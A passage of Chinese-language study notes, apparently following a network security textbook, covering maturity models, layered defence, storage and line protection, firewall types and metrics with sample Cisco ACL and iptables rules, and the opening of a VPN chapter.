- l4 Quantitatively Managed:量化标准和指标。
- l5 Optimizing:可持续化优化。

#### SSE-CMM
Systems Security Engineering Capability Maturity Model  
过程类别：工程Engineering，组织Organazation，项目过程Project  
22项过程列表。工程过程、风险过程、保证过程的相互关系。  
### 数据安全能力成熟度模型
数据安全能力从组织建设、制度流程、技术工具及人员能力四个维度评估。
### 软件安全能力成熟度
CMM1-5

7.22
---
### 纵深防御模型
多道保护线，相互支持和补救。  
- 第一道防线：安全保护。 
- 第二道防线：安全监测。
- 第三道防线：实时响应。
- 第四道防线：恢复。
### 分层防护模型
基于OSI七层模型的分层防护策略，每一层对应的安全措施和防护方法：

#### 物理层防护：

- 物理安全控制：确保数据中心和网络设备的物理安全，如门禁系统、视频监控。
- 环境控制：保护设备免受环境威胁，如温度、湿度和电力问题。
- 防止硬件篡改：使用防篡改设备和机柜锁。

#### 数据链路层防护：
节点间数据帧的传输和错误检测、纠正。包括媒体访问控制（MAC）地址和网络拓扑。
*数据链路层处理的是网络中的直接连接设备之间的通信，并管理这些设备的物理地址（如MAC地址）。*
- MAC地址过滤：限制网络设备之间的通信。
- VLAN隔离：通过虚拟局域网隔离不同的网络流量。  
    - VLAN（虚拟局域网）：是一种网络虚拟化技术，用于将一个物理网络划分为多个逻辑网络。每个VLAN是一个独立的广播域，即使它们共享相同的物理网络基础设施。  
    - VLAN技术主要在数据链路层操作，通过使用交换机来划分网络。交换机在数据链路层工作，处理和转发基于MAC地址的数据帧。
- ARP防护：防止地址解析协议攻击，如ARP欺骗。
    - ARP（地址解析协议）：在IPv4网络中，用于将IP地址映射到MAC地址。ARP请求和响应在局域网内广播，允许设备找到彼此的硬件地址。MAC地址是数据链路层的核心元素。

#### 网络层防护：
负责数据包的路由和转发，管理逻辑地址（如IP地址）。决定数据包如何通过多个网络传输到目的地。  
*包括IP（Internet Protocol）、ICMP（Internet Control Message Protocol）。*

- 路由安全：使用路由协议认证和过滤，防止路由表篡改。
- 防火墙：设置网络防火墙，控制进出网络的流量。
- IPsec：使用IPsec协议进行网络层加密，确保数据包的机密性和完整性。
    - IPsec是一个套件，包含多个协议（如AH（Authentication Header）和ESP（Encapsulating Security Payload）），这些协议用于在网络层上提供数据包的加密和验证。
    - IPsec通过在IP数据包的头部和有效载荷之间插入一个IPsec头部来实现其功能。它保护了网络层的数据包，无论数据包的内容是什么，应用层协议如何。所以属于网络层防护。
    - 为所有使用IP协议的数据包提供统一的安全保护，而不需要每个应用程序实现自己的安全机制。

#### 传输层防护：
传输层负责端到端的数据传输管理，确保数据在两个主机之间可靠传输。
它提供了数据流控制、错误检测与纠正、数据包排序等服务。
传输层的主要协议包括TCP（Transmission Control Protocol）和UDP（User Datagram Protocol）。

- 传输层加密：使用SSL/TLS协议加密传输层数据，确保数据在传输过程中机密性和完整性。
    - SSL（Secure Sockets Layer）。
    - TLS（Transport Layer Security），SSL的后继版本，改进了安全性和性能。
        - 加密数据传输：SSL/TLS加密传输层的数据，防止数据在传输过程中被窃听。
        - 数据完整性：使用消息认证码（MAC）确保数据在传输过程中未被篡改。
        - 身份验证：通过数字证书验证通信双方的身份，防止中间人攻击。
    - SSL和TLS直接在传输层协议（TCP）之上工作。
    - HTTPS是使用SSL/TLS保护的HTTP，而FTPS是使用SSL/TLS保护的FTP。*通过保护传输层数据，间接地为应用层协议提供安全服务。*
- 端口扫描防护：使用入侵检测和防御系统（IDS/IPS）检测和阻止端口扫描行为。
- 传输层协议过滤：在防火墙上配置规则，限制不必要的传输层协议（如TCP/UDP）的使用。

#### 会话层防护：
现代网络应用和协议通常将会话层和表示层的功能集成到应用层中。例如，HTTP协议不仅处理应用层的功能，还包括某些会话层和表示层的功能，如会话管理（Cookies）和数据格式化（MIME类型）。  
具体实现：许多协议和技术在实现时，会话层和表示层的功能已经被具体的技术和工具实现。例如，TLS/SSL协议虽然在表示层工作，但开发人员通常通过API（如OpenSSL库）直接使用，而不需要详细理解底层实现。
？TSL/SSL传输层？→加密功能类似

- 会话管理：使用安全会话管理技术，防止会话劫持和重放攻击。
- 会话超时：配置会话超时策略，自动终止长时间不活动的会话。
- 会话加密：在会话层实施加密，保护会话数据。

##### 会话层和表达层的技术
TLS/SSL：虽然主要被认为是传输层协议，但它也涉及会话管理和数据加密解密。
JSON和XML：作为数据格式化标准，属于表示层范畴，确保不同系统间的数据交换格式一致。
OAuth：作为认证协议，管理会话和令牌，属于会话层和应用层之间的功能。

#### 表示层防护：
数据格式化和转换：表示层负责数据的格式化、加密和解密，确保发送方和接收方能够正确理解数据。
数据压缩：表示层可以对数据进行压缩和解压缩，以提高传输效率。
数据加密：表示层可以对数据进行加密和解密，确保数据在传输过程中的安全性。
数据格式化协议：例如，JPEG和MPEG是用于图像和视频数据的格式化协议，表示层负责处理这些格式。

- 数据加密和解密：使用强加密算法对数据进行加密和解密，确保数据的机密性。
- 数据格式化安全：防止格式化数据时的安全漏洞，如防止恶意代码注入。
- 压缩和解压缩安全：确保压缩和解压缩过程的安全性，防止压缩文件中的恶意代码执行。

#### 应用层防护：
提供用户接口和应用服务，如HTTP、FTP、SMTP等。
直接与用户交互，处理高层协议的数据。

- 应用防火墙：使用Web应用防火墙（WAF）保护应用程序免受常见的应用层攻击，如SQL注入和跨站脚本（XSS）。
- 安全编码实践：开发人员遵循安全编码实践，减少应用层漏洞。
用户认证和授权：实施强用户认证和授权机制，确保只有授权用户才能访问应用程序。
- 漏洞扫描和渗透测试：定期对应用程序进行漏洞扫描和渗透测试，识别和修复安全漏洞。

7.23
---
### 等级保护模型
确定安全等级。  
确定对应的安全要求。
依据要求，平衡要求、成本、风险，规划、设计、实施和验收。

### 网络生存模型
“3R”：Resistance, Recognition, Recovery

## 网络安全体系建设原则与安全策略
### 网络安全原则
#### 系统性，动态性原则
“木桶原则”
##### 纵深防护与协作性原则
##### 网络安全风险和分级保护原则
正确处理需求、风险和代价的关系，安全性与可用性相容。  
分级保护原则指根据***网络资产的安全级别***，采取合适措施来保护网络资产。
##### 标准化与一致性
安全体系设计的一致性
##### 技术与管理相结合
##### 安全第一，预防为主原则
##### 业务与安全等同
##### 人机物融合和产业发展原则
### 网络安全策略
有关保护对象的网络安全规则和要求。  
一个网络安全策略文件应具备：
- 涉及范围
- 有效期
- 所有者
- 责任
- 参考文件
- 策略主题内容
- 复查
- 违规处理

# 第五章 物理环境安全技术
## 网络通信线路安全分析与防护
### 通信线路安全分析
网络通信线路被：1切断 2电磁干扰 3电磁信号泄密
### 安全防护
#### 网络通信设备
设备冗余（设备之间互为备份）
#### 网络通信线路
采取多路通信的方式  
如网络连接可以通过DDN专线和电话线。  
举例的ISP网络拓扑图，冗余解决办法+交换机和路由器交叉互联，ISP与外部网络连接有两个出口

## 存储介质安全分析与防护
### 安全分析
威胁：存储管理失控，存储数据泄密，存储介质及存储设备故障，存储介质数据非安全删除，恶意代码攻击。
### 安全防护
强化存储安全管理，数据存储加密保存，容错容灾存储技术（磁盘阵列，双机在线备份，离线备份）。  
##### 磁盘阵列
RAID, Redundant Array of Independent Disks。将多个物理硬盘驱动器组合成一个逻辑单元的技术，通过数据冗余和性能提升来提高存储系统的可靠性和效率。 
- RAID 0（条带化）：
    描述：数据在多个磁盘上条带化分布，未提供冗余。
    优点：读写性能高。
    缺点：没有数据冗余，一旦一个磁盘失败，所有数据都会丢失。

- RAID 1（镜像）：
    描述：数据在两个磁盘上完全复制，提供冗余。
    优点：数据冗余高，可靠性强。
    缺点：存储效率低（只有50%），写入性能稍低。

- RAID 5（分布式奇偶校验）：
    描述：数据和奇偶校验信息分布在多个磁盘上，需要至少三个磁盘。
    优点：提供数据冗余和较好的存储效率，读性能高。
    缺点：写入性能相对较低，恢复时间较长。

- RAID 6（双重奇偶校验）：
    描述：与RAID 5类似，但使用双重奇偶校验，需要至少四个磁盘。
    优点：能容忍两个磁盘同时失效。
    缺点：写入性能较低，恢复时间更长。

- RAID 10（条带化镜像）：
    描述：结合RAID 0和RAID 1的优点，条带化数据并在每个条带上进行镜像。
    优点：高性能和高冗余，读写性能优秀。
    缺点：存储效率较低，需要较多磁盘。

## 第五章小结
网络通信线路&存储介质安全的分析和防护

# 第八章 防火墙技术原理与应用
## 概念
### 安全区域划分
- Internet
- 内联网(Intranet)，公司/组织专用网络
- 外联网（Extranet），Intranet的扩展延伸，常用作组织与合作伙伴之间进行通信。
- 军事缓冲区域，DMZ，Demilitarized Zone  
在安全区域划分基础上，通过防火墙，控制安全区域间的通信，隔离有害通信，进而阻断网络攻击。  
一般安装在不同安全区域边界处，用于网路通信安全控制。

### 工作原理
软硬件组合而成的网络访问控制器，它根据一定的安全规则来控制流过防火墙的网络包，如禁止或转发，能屏蔽被保护网络内部的信息、拓扑结构和运行状况。  
防火墙根据网络包所提供的信息实现网络通信访问控制：如果网络通信包符合网络访问控制策略，就允许该网络通信包通过防火墙。
- 白名单策略
- 黑名单策略  

简单的可以用路由器、交换机实现。复杂的一组机器。  
防火墙访问控制可以作用于网络接口层（主要对应物理层和数据链路层）、网络层、传输层、应用层。  
如果没有防火墙，网络中的每台主机都要安装安全软件。
功能：
- 过滤非安全网络访问。
仅授权用户访问。
- 限制网络访问。
只允许外部网络访问受保护网络的指定主机或网络服务。（通常Mail，FTP，WWW服务器可让外网访问）
- 网络访问审计。
日志。可以掌握网络使用情况，网络通信带宽和访问外部网络的服务数据。防火墙日志也可用于入侵检测和网络攻击取证。
- 网络带宽控制。
防火墙可控制网络带宽的分配使用，实现部分网络质量服务QoS保障。
- 协同防御。
防火墙和IDS通过交换信息实现联动。

### 防火墙安全风险
#### 网络安全旁路
防火墙只对通过它的网络通信包进行访问控制。例如，从内部网络直接拨号访问外网。
#### 防火墙功能缺陷
- 不能完全防止感染病毒的软件或文件传输。
- 不能防止基于数据驱动式的攻击。
- 不能完全防止后门攻击。
#### 防火墙安全机制形成单点故障和特权威胁
若防火墙自身安全管理失效，就会对网络造成单点故障和网络安全特权失控。
#### 防火墙无法有效防范内部威胁
内网用户操作失误
#### 效用受限于安全规则
依赖规则更新，特别是采用黑名单策略的防火墙。
### 防火墙发展
#### 控制粒度变化
从IP地址信息到IP包内容
#### 检查功能持续增强
DPI deep packet inspection
用于检查网络通信中的数据包内容，而不仅仅是头部信息。DPI能够深入到每个数据包的负载部分（payload），以识别、分类和管理流量。
#### 产品分类更加细化
工控防火墙、Web防火墙、数据库/数据防火墙等
#### 智能化增强

## 防火墙类型和实现技术
### 包过滤 Packet Filtering Firewall
在ip层（网络层）实现的防火墙技术，通过检查数据包的***源IP地址、目的IP地址、源端口、目的端口和协议类型***（UDP,TCP,ICMP）来决定是否允许或拒绝这些数据包。  
##### 缺点：
只能基于包头信息进行过滤，无法检测数据包的内容和应用层协议。容易受到IP欺骗等攻击。
不能在用户级别进行过滤。如不能识别不同用户和防止IP地址的盗用。
##### 实现技术：
使用访问控制列表（ACLs），根据预定义的规则集过滤数据包。匹配操作有拒绝转发审计三种。
##### 典型格式
规则号、匹配条件、匹配操作
一个例子:
```
access-list 101 permit tcp 192.168.1.0 0.0.0.255 any eq 80
access-list 101 deny ip any any
```
这段配置允许来自192.168.1.0/24网络的所有主机访问任何目的主机的HTTP服务（端口80），并拒绝所有其他流量。
格式：
`access-list [ACL编号] [permit|deny] [源IP地址] [通配符掩码source-wildcard][log]`
每项表示：P180

### 状态检查技术
Stateful Inspection Firewall
基于状态的防火墙，通过利用TCP会话和UDP“伪”会话的状态信息进行网络访问机制。
首先建立并维护一张会话表。
当有符合 已定义安全策略的TCP连接/UDP流时，防火墙创建会话项，依据状态表检查，与会话相关联的包通过。  
*流程图P182*  
大致流程：接受数据包👉检查有效性👉查找会话表👉查找策略表  
会话表👉检查数据包的序列号和会话状态👉进行地址转换和路由
策略表👉符合则增加进会话表

### 应用服务代理
Application Proxy Firewall
应用层网关防火墙，代理防火墙
客户端和服务器之间没有直接的网络连接。
采用代理服务技术的防火墙简称代理服务器。***代理服务器是防火墙。*** 通常由一组按应用分类的代理服务程序和身份验证服务程序构成。。每个代理服务程序用到一个指定的网络端口，代理客户程序通过该端口获得相应的代理服务。

##### 工作原理

- 代理角色：代理防火墙代表客户端向目标服务器发送请求，然后将服务器的响应返回给客户端。

- 协议分析：防火墙可以深入分析应用层协议，如HTTP、FTP、SMTP等。通过检查协议的细节，它可以阻止不合法的命令和数据，防止协议级别的攻击，如SQL注入、XSS攻击等。

- 内容过滤：由于可以访问数据包的完整内容，应用服务代理防火墙可以进行内容过滤。例如，它可以阻止包含特定关键词的电子邮件或网页，或者限制访问某些类型的网站。

- 身份验证和授权：代理防火墙可以在允许用户访问资源之前进行身份验证。这可以防止未经授权的访问，并确保只有经过验证的用户可以访问特定的资源。

- 日志和审计：应用服务代理防火墙能够记录详细的通信日志，包括请求的时间、用户信息、访问的资源等。

##### 优点
- 隐藏内部网络结构
- 支持多种用户认证方案。能基于用户身份、时间、请求类型等进行复杂访问控制。
- 分析数据包内部的应用命令。
- 提供详细审计记录。
##### 缺点
- 速度慢
- 对用户不透明
- 不支持所有网络协议
- 如出现故障会导致通信中断

7.30
---
### 网络地址转换技术
NAT Network Address Translation
为了解决公开地址不足。
它透明的对所有内部地址作转换，使外部网络无法了解内部网络的结构。  
基于NAT技术的防火墙上配置有合法公共IP地址集，当内部某一用户访问外网时，防火墙动态地从地址集中选一个未分配地址分配给该用户，给用户即可使用这个合法地址进行通信。

原理：通过修改IP包头中的IP地址信息来改变IP地址。

静态NAT（Static NAT）：每个私有IP地址***永久***映射到一个唯一的公共IP地址。这种方式适合需要外部设备直接访问的内部设备，如Web服务器。

NAT池（Pooled NAT）：私有IP地址池中的地址***动态分配***映射到公共IP地址池中的地址，且映射是临时的。

端口地址转换（PAT，Port Address Translation）或NAT重载：多台设备共享一个公共IP地址，通过不同的端口号来区分每个设备的连接。比如Linux自带的IPtables。

### 总结对比
#### 包过滤防火墙（Packet Filtering Firewall）
##### 原理：
基于数据包的头部信息，如***源IP地址、目的IP地址、源端口、目的端口和协议类型***，来决定是否允许数据包通过。
##### 优点：
简单高效，性能开销小。
易于配置和理解。
##### 缺点：
只能处理网络层和传输层信息，无法检查应用层内容。
无法跟踪连接状态，易受IP欺骗和端口扫描攻击。

#### 状态检查防火墙（Stateful Inspection Firewall）
##### 原理：
不仅检查数据包的头部信息，还跟踪***每个连接的状态（如TCP的三次握手）***。它维护一个状态表，记录所有活动连接的信息。
##### 优点：
提供比包过滤更高的安全性，能够识别和阻止不合法的会话。
可以处理网络层和传输层的信息。
##### 缺点：
相对于包过滤防火墙，配置复杂，性能开销变大。
不能深入检查应用层数据。

####  应用服务代理防火墙（Application Proxy Firewall）
##### 原理：
在应用层工作，充当客户端和服务器之间的代理。***所有流量都通过代理，代理可以检查和过滤应用层协议的数据内容。***
##### 优点：
能够深入检查和控制应用层内容，防止应用层攻击（如SQL注入、XSS）。
隐藏内部网络结构，提高匿名性。
##### 缺点：
性能开销大，可能导致网络延迟。
配置和维护复杂，适应性较差。

#### 基于NAT的防火墙
##### 原理：
使用网络地址转换（NAT）将私有IP地址转换为公共IP地址，隐藏内部网络结构。同时结合防火墙功能进行数据包过滤和流量控制。
##### 优点：
隐藏内部网络IP地址，增加安全性。
可以节省公共IP地址，支持更多设备通过少量公共IP上网。
灵活性好，适用于各种网络规模。
##### 缺点：
配置复杂，特别是在处理多个公共IP和端口映射时。
某些依赖IP地址的应用程序可能会受到影响，如VoIP、视频会议。

#### 总结
- 包过滤防火墙：适用于基本的网络访问控制，配置简单，但安全性有限。
- 状态检查防火墙：提供更高的安全性，适合需要跟踪连接状态的中型到大型网络。
- 应用服务代理防火墙：提供最强的应用层安全性，但性能开销大，适用于高安全性环境。
- 基于NAT的防火墙：结合NAT和防火墙功能，提供IP地址隐藏和访问控制，适合需要节省IP地址和保护内部网络结构的网络。

### Web防火墙技术
用于保护Web服务器和Web应用。根据预先定义的过滤规则和安全防护规则，对所有访问Web服务器的HTTP请求和服务器响应，进行HTTP协议和内容过滤。
常见功能：
- 允许/禁止HTTP请求类型。
    允许: GET, POST；禁止: PUT, DELETE
- HTTP协议头各个字段的长度限制
    比如：
    User-Agent最大长度: 255字符
    Referer最大长度: 512字符
    Cookie最大长度: 1024字符
- 后缀名过滤
- URL内容关键字过滤
- Web服务器返回内容过滤
    比如错误信息中包含的服务器版本信息、调试信息、数据库错误等。

### 数据库防火墙技术
基于数据通信协议深度分析和虚拟补丁。
>虚拟补丁：*在数据库外部创建一个安全屏障层，* 当数据库系统存在已知漏洞且尚未修补时，数据库防火墙可以应用特定规则来临时屏蔽这些漏洞的利用，从而提供临时保护。

P185图片：数据库防火墙的几个匹配层次。
- 会话级匹配：主要分析连接和会话相关的信息，如用户身份、连接时间、IP地址等。它可以用于阻止未经授权的用户会话或异常的连接模式。
- 操作对象匹配：分析请求中涉及的数据库对象，如表、视图等。它检查用户是否有权访问特定的数据库对象，并可以阻止对敏感数据的访问。
- 描述信息匹配：这一层更深入地分析SQL请求的具体内容，包括操作的类型（如SELECT、INSERT、UPDATE、DELETE）和请求的详细结构。

### 工控防火墙技术
Industrial Control System Firewall, ICS Firewall
侧重于分析工控协议。
实时性要求高。高可用性要求。
ICS使用专有的通信协议（Modbus，IEC 618501, DNP3，OPC等）

### 下一代防火墙
传统功能：集成包过滤、状态检测、地址转换等。
新功能：
- 应用识别和控制：不依赖端口；对应用层协议&app的精准识别。
- 入侵防护（IPS）。
- 数据防泄露。
- 恶意代码防护。基于信誉的恶意检测技术。
- URL分类与过滤。构建URL分类库。
- 带宽管理与QoS优化。
- 加密通信分析。通过中间人代理和重定向等技术，对SSL、SSH等加密的网络流量监测分析。
- 可应对安全威胁演变、检测隐藏的网络活动、动态快速响应攻击、同意安全策略部署、智能化安全管理。

### 防火墙共性关键技术
#### 深度包检测
Deep Packet Inspection DPI
对于报的数据内容及包头信息进行检查分析的技术方法。
DPI运用模式（特征）匹配、协议异常检测等方法对报的数据内容进行分析。

#### 操作系统
#### 网络协议分析

## 防火墙主要产品和技术指标
#### 网络防火墙
部署在不同安全域之间。网络层访问控制及过滤。
#### Web应用防火墙
根据预先定义的规则，对访问服务器的http请求和服务器响应进行http协议和内容过滤。
#### 数据库防火墙
#### 主机防火墙
部署在终端计算机上，监测和控制网络级数据流和应用程序访问。
#### 工控防火墙
#### 下一代防火墙
#### 家庭防火墙
防火墙功能模块集成在智能路由器中，IP地址控制，MAC地址限制，防蹭网等。

7.31
---
### 防火墙主要技术指标
P189 表8-2
- 网络接口：所能保护的网络类型。
- 协议支持
- 路由支持
- 设备虚拟化
- 加密支持
- 认证支持
- 访问控制：包过滤，NAT，状态检测，动态开放端口，IP\Mac地址绑定
- 流量管理
- 应用层控制
- 攻击防护
- 管理功能
- 审计和报表

### 防火墙性能指标
#### 最大吞吐量Max Throughput：
检查防火墙在***只有一条默认允许规则***和***不丢失数据包***的情况下能达到的***最大吞吐速率***。通常以*每秒兆比特（Mbps）*、*千兆比特（Gbps）* 为单位衡量。
**单位时间内通过多少数据量**，衡量**数据量流通能力**。
比如网络层吞吐量、http吞吐量、SQL吞吐量。
#### 最大连接速率 Max Connection Rate
每秒能够建立的新连接的数量。Connections per second, cps.
**单位时间内处理多少新连接**，衡量**连接建立的能力**。
#### 最大规则数 Maximum Number of Rules
检查在添加大数量访问规则的情况下，防火墙性能变化状况。
最大规则数指**防火墙能够支持的访问控制规则的数量**。这些规则用于定义允许或拒绝的流量。需要考虑：规则复杂性，规则优化。
#### 并发连接数 Concurrent Connections
防火墙在单位时间内所能建立的最大TCP连接数。可以同时保持的活跃连接数量。
包括：状态表容量：防火墙使用状态表来跟踪每个连接的状态。状态表容量越大，防火墙能够支持的并发连接就越多。

#### 防火墙安全保障指标
开发、指导性文档、生命周期支持、测试、脆弱性。

#### 环境适应性指标
网络环境、物理环境

#### 防火墙自身安全指标
身份识别，管理能力，异常处理机制，操作系统安全升级

## 防火墙防御体系结构类型
### 基于双宿主主机防火墙结构 Dual-Homed Host Firewall
至少具有两个网络接口卡的主机系统。将一个内部网络和外部网络分别连接在不同的网卡上，使内外网络不能直接通信。

### 基于代理型防火墙结构
代理服务器主机+过滤路由器

### 基于屏蔽子网的防火墙结构
内部网络和外部网络间引入DMZ。  

## 防火墙技术应用
### 防火墙应用场景类型
上网保护，网站保护，数据保护，网络边界保护，终端保护，网络安全应急响应。
### 防火墙部署基本方法
##### 第一步：划分安全区域
根据组织或公司的安全策略要求，将网络划分成若干安全区域。这些区域通常包括内部网络、外部网络、DMZ（隔离区）等。每个区域代表不同的安全级别和功能。

##### 第二步：设立访问控制点
在安全区域之间设置针对网络通信的访问控制点。这些控制点用于管理和控制不同区域之间的流量，确保只有符合安全策略的通信能够通过。

##### 第三步：制定边界安全策略
针对不同访问控制点的通信业务需求，制定相应的边界安全策略。策略应详细规定允许和拒绝的流量类型、来源和目标，以及其他相关的安全措施。

##### 第四步：选择防火墙技术和防范结构
依据控制点的边界安全策略，采用合适的防火墙技术和防范结构。这包括选择适当的硬件或软件防火墙，确定防火墙的部署模式（如网络层、防护层等），以及配置防火墙的功能（如NAT、VPN等）。

##### 第五步：配置网络安全策略
在防火墙上，配置实现对应的网络安全策略。这包括设置访问控制列表（ACLs）、启用日志记录、配置用户和设备认证等，以确保网络通信的安全性和可控性。

##### 第六步：测试和验证边界安全策略
测试和验证边界安全策略是否正常执行。通过模拟攻击、渗透测试等手段，检查防火墙的配置是否能够有效地防护不符合安全策略的流量，并确保合法流量能够顺利通过。

##### 第七步：运行和维护防火墙
最后，确保防火墙的长期稳定运行和维护。定期更新防火墙规则和固件，监控网络活动日志，及时响应安全事件，并根据需求调整和优化防火墙配置.

### IPtables防火墙应用参考
P193 原文：`https://www.thegeekstuff.com/2011/06/iptables-rules-examples/`
```yaml
Flush Rules: Remove all existing rules with iptables -F.
Default Policy: Set default policies for INPUT, FORWARD, and OUTPUT chains to DROP.
Block IP: Block a specific IP with iptables -A INPUT -s [IP] -j DROP.
Allow SSH: Allow all SSH connections on port 22.
Restrict SSH: Allow SSH from a specific network.
Allow HTTP/HTTPS: Allow HTTP (port 80) and HTTPS (port 443) traffic.
Multiport: Use multiport to allow multiple ports (SSH, HTTP, HTTPS).
Outgoing SSH: Allow outgoing SSH connections.
Restrict Outgoing SSH: Allow outgoing SSH only to a specific network.
Outgoing HTTPS: Allow outgoing HTTPS traffic.
Load Balancing: Load balance incoming traffic using nth extension.
Allow Ping: Allow ping (ICMP echo request and reply).
Ping from Inside: Allow ping from inside to outside.
Loopback: Allow full loopback access.
Internal to External: Allow internal network to communicate with external.
DNS: Allow outgoing DNS connections.
NIS: Allow NIS connections.
Rsync: Allow rsync from a specific network.
MySQL: Allow MySQL connections from a specific network.
Email Traffic: Allow Sendmail or Postfix traffic.
IMAP: Allow IMAP and IMAPS traffic.
POP3: Allow POP3 and POP3S traffic.
Prevent DoS: Use limit extension to prevent DoS attacks.
Port Forwarding: Forward traffic from one port to another.
Log Dropped Packets: Log and drop packets in the LOGGING chain.
```

8.1
---
### Web应用防火墙应用参考
OWASP核心规则集
CRS核心规则集
CRS3.0提供13种常见的攻击规则类型。

### 包过滤防火墙应用参考
ACL配置例子：
- 删除现有的ACL:
```perl
no access-list 100
```
这行命令删除编号为 100 的现有 ACL。

- 创建新的ACL:
```r
access-list 100 deny ip 14.2.6.0 0.0.0.255 any log
```
这行命令创建一个新的ACL条目，编号为 100，拒绝源地址为 14.2.6.0/24（子网掩码 255.255.255.0）的任何 IP 数据包，并记录日志。

- 拒绝特定的IP地址:
```bash
access-list 100 deny ip host 14.x.y.z host 14.x.y.z log
```
拒绝来自特定主机 14.x.y.z 的 IP 数据包，并记录日志。

- 拒绝本地和私有地址:
```r
access-list 100 deny ip 127.0.0.0 0.255.255.255 any log
access-list 100 deny ip 10.0.0.0 0.255.255.255 any log
access-list 100 deny ip 0.0.0.0 0.255.255.255 any log
access-list 100 deny ip 172.16.0.0 0.15.255.255 any log
access-list 100 deny ip 192.168.0.0 0.0.255.255 any log
access-list 100 deny ip 192.0.2.0 0.0.0.255 any log
access-list 100 deny ip 169.254.0.0 0.0.255.255 any log
```
拒绝常见的私有网络和本地网络地址，防止内部网络的地址被伪装为外部流量。

- 拒绝广播和多播地址
```r
access-list 100 deny ip 224.0.0.0 15.255.255.255 any log
access-list 100 deny ip any host 14.2.6.255 log
access-list 100 deny ip any host 14.2.6.0 log
```
这些规则拒绝多播和广播地址的流量，记录日志。

- 允许特定的TCP和ICMP流量:
```r
access-list 100 permit tcp any 14.2.6.0 0.0.0.255 established
access-list 100 permit icmp any any echo log
access-list 100 deny icmp any any redirect log
access-list 100 deny icmp any any mask-request log
access-list 100 permit icmp any 14.2.6.0 0.0.0.255
```
允许建立连接的 TCP 流量到 14.2.6.0/24 网络。
允许 ICMP echo 请求（ping），但拒绝 ICMP 重定向和掩码请求，并记录日志。

- 特定协议的允许与拒绝:
```r
access-list 100 permit ospf 14.1.0.0 0.0.255.255 host 14.x.y.z
access-list 100 deny tcp any any range 6000 6063 log
access-list 100 deny tcp any any eq 6567 log
```
允许 OSPF 协议流量到特定的主机 14.x.y.z。
拒绝 TCP 端口范围 6000 到 6063 以及端口 6567 的流量，并记录日志。

Configure Commonly Used IP ACLs: `https://www.cisco.com/c/en/us/support/docs/ip/access-lists/26448-ACLsamples.html#toc-hId--707141680`

《Cisco ASA - All-in-one Next-generation Firewall, IPS and VPN Services》 P229

### 工控防火墙应用参考

# 本章总结
防火墙概念、工作原理、实现技术、评价指标。
防火墙防御体系结构、应用案例。

# 其他材料补充
## 1
`https://mp.weixin.qq.com/s/KTSJaY6Q7iCf-UpnKuAOpg`

### 安全区域
安全区域是防火墙中重要的概念，防火墙可以将不同的接口划分到不同的安全区域。
一个安全区域可以说就是***若干个接口的集合***，一个安全区域里面的接口具有相同的安全属性。

- 受信trust：内网终端用户
- 非受信untrust：Internet
- 非军事化区域DMZ：内网服务器
- 本地区域local：设备及设备接口本身

### 安全策略
安全策略是防火墙中对流量转发、以及对流量中的内容进行安全一体化检测的策略。
安全策略由匹配条件、动作、安全配置文件组成。
- 匹配条件包括五元组（源地址、目的地址、源端口、目的端口、协议）、VLAN、源安全区域、目的安全区域、用户、时间段等。
- 动作，permit/deny。permit👉内容安全检测。
- 安全配置文件

#### 安全策略匹配过程
安全策略的匹配按照策略列表顺序执行，从上往下逐条匹配，如果匹配了某条策略，将不再往下匹配。
***需要优先配置精确的安全策略，然后再配置粗略的安全策略。***

### 会话表
会话表用来记录TCP、UDP、ICMP等协议连接状态的表项，是防火墙转发报文的重要依据；
   
防火墙基于“状态”转发报文：
1. 只对首包或者少量报文进行检测然后确认一个连接状态；（会话表）
2. 后续大量的报文根据连接状态进行控制；  

会话表记录大量连接状态。

#### 会话表的创建
防火墙在开启状态检测情况下，只有首包会创建会话表项，后续报文匹配会话表即可转发；

### 会话表老化时间
系统会在一条表项连续未被匹配一段时间后，将其删除，即会话表项已经老化。

### 长连接
为特殊流量设定超长老化时间。

8.2
---
## Server-map
当设备将只允许内网用户单方向主动访问外网，一些特殊协议不能正确匹配会话表。
Server-map用于存放一种*映射关系*。
这种映射关系可以是控制数据协商出来的数据连接关系；也可以是配置NAT中的地址映射关系；使得外部网络能透过设备主动访问内部网络。

##### server-map表报文转发过程

防火墙收到报文后，如果没有命中会话表，防火墙则进入首包处理流程，查询是否命中server-map表。
如果命中，则生成会话表，转发报文；
如果没有命中，则执行其他包处理流程。

Server-Map 表通常包含如下信息：

服务器IP地址：指定服务或应用程序所在的服务器IP地址。
协议类型：定义服务或应用程序使用的协议类型。
端口范围：允许使用端口范围，适用于动态端口的协议。
其他标识符：可以包含其他用于标识特定服务或应用程序的参数。

##### 区别
假设一个数据包到达防火墙，其处理流程如下：

- 会话表检查：数据包首先检查是否在会话表中，如果在，会话状态有效则直接转发数据包。
- Server-Map 表检查：如果数据包不在会话表中，防火墙检查Server-Map表。例如，数据包可能是某个动态端口的特殊协议流量，如果符合Server-Map表规则，则生成新的会话表项。
- 策略表检查：如果数据包不在Server-Map表中，则检查策略表。如果策略表允许该流量，则添加会话到会话表并转发数据包；否则丢弃数据包并记录日志。


# 第九章 VPN技术原理与应用
Virtual Private Network。
## 概述
### VPN概念
把需要经过公共网传递的报文(packet)加密处理后，再由公共网络发送到目的地。VPN技术能够在不可信任的公共网络上构建一条专用的安全通道，经过VPN传输的数据在公共网络上具有保密性。

### VPN安全功能
- 保密性服务Confidentiality，防止传输的信息被监听。
- 完整性服务Integreity, 防止传输的信息被修改。
- 认证服务Authenticiation，提供用户和设备的访问认证，防止非法接入。

### VPN发展
- 客户端简化
- 网关一体化 Unified Gateway Integration
- VPN产品可能演变成可信网络产品
- 提供标准安全管理数据接口，能够纳入SOC中心进行管理控制。

### VPN技术风险
1. 产品代码实现的安全缺陷
2. 密码算法安全缺陷
3. 管理不当

## VPN类型和实现技术
分类，从层级来分，链路层VPN，网络层VPN，传输层VPN。
实现技术，密码算法、密钥管理、认证访问控制、IPSec、SSL、PPTP和L2TP。

8.5
---
### VPN类型
链路层：ATM、Frame Relay、多协议
网络层：受控路过滤，隧道技术
传输层：通过SSL。

### 密码算法
VPN的核心技术是密码算法

### 密钥管理
#### 密钥的分发
1. 手工配置
2. 密钥交换协议动态分发
##### Diffie-Hellman (DH) 密钥交换协议    
##### Internet Key Exchange (IKE) 协议

工作原理：
- 阶段1：ISAKMP SA的建立：
双方通过交换IKE报文，协商加密算法、认证方法等参数，使用Diffie-Hellman算法生成共享密钥。
建立一个安全的ISAKMP安全关联（SA），用于保护后续的密钥交换过程。
- 阶段2：IPsec SA的建立：
双方在已建立的ISAKMP SA基础上，进一步协商IPsec SA的参数。
使用已生成的共享密钥，动态生成会话密钥，用于加密实际的数据传输。

#### 主要的密钥交换和管理标准
